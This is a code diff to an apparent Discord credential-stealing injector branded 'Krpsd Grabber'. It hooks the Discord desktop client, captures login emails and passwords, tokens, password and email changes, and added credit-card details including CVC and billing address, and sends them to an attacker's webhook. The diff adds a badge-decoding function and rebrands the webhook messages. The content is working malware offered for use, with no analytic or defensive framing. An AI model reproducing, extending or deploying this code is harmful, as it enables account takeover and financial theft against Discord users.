@@ -59,6 +59,58 @@ function SendToWebhook(what) {
     `, !0).then((token => {}))
 }
 
+  function GetBadges(flags)
+  {
+  const Discord_Employee = 1;
+  const Partnered_Server_Owner = 2;
+  const HypeSquad_Events = 4;
+  const Bug_Hunter_Level_1 = 8;
+  const House_Bravery = 64;
+  const House_Brilliance = 128;
+  const House_Balance = 256;
+  const Early_Supporter = 512;
+  const Bug_Hunter_Level_2 = 16384;
+  const Early_Verified_Bot_Developer = 131072;
+  
+  var badges = "";
+  
+  if((flags & Discord_Employee) == Discord_Employee){
+     badges += "Staff,";
+  }
+  if((flags & Partnered_Server_Owner) == Partnered_Server_Owner){
+     badges += "Partner,";
+  }
+  if((flags & HypeSquad_Events) == HypeSquad_Events){
+     badges += "Hypesquad Event,"
+  }
+  if((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1){
+     badges += "Green Bughunter,";
+  }
+  if((flags & House_Bravery) == House_Bravery) {
+     badges += "Hypesquad Bravery,";
+  }
+  if((flags & House_Brilliance) == House_Brilliance){
+     badges += "HypeSquad Brillance,";
+  }
+  if((flags & House_Balance) == House_Balance){
+     badges += "HypeSquad Balance,";
+  }
+  if((flags & Early_Supporter) == Early_Supporter){
+     badges += "Early Supporter,";
+  }
+  if((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2){
+     badges += "Gold BugHunter,";
+  }
+  if((flags &Early_Verified_Bot_Developer ) == Early_Verified_Bot_Developer ){
+     badges += "Discord Developer,";
+  }
+  if (badges == "" ){
+      badges = "None"
+  }
+  return badges;
+  
+  }
+
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -75,9 +127,9 @@ function Login(email, password, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "Krpsd Injector",
+                username: "Krpsd Grabber",
                 content: "",
-                avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "color": 16507654,
@@ -98,7 +150,7 @@ function Login(email, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Krpsd Grabber Injector"
+                            "text": "Injector by Krpsd"
                         }
                     }
                 ]
@@ -124,7 +176,7 @@ function ChangePassword(oldpassword, newpassword, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "Krpsd Injector",
+                username: "Krpsd Grabber",
                 content: "",
                 avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
@@ -152,7 +204,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Krpsd Grabber Injector"
+                            "text": "Injector by Krpsd"
                         }                 
                     }
                 ]
@@ -177,9 +229,9 @@ function ChangeEmail(newemail, password, token) {
         xmlHttp.responseText;
     `, !0).then((ip) => {
             var params = {
-                username: "Krpsd Injector",
+                username: "Krpsd Grabber",
                 content: "",
-                avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "color": 16507654,
@@ -205,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Krpsd Grabber Injector"
+                            "text": "Injector by Krpsd"
                         }                
                     }
                 ]
@@ -259,7 +311,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Krpsd Grabber Injector"
+                            "text": "Injector by Krpsd"
                         }
                     }
                 ]
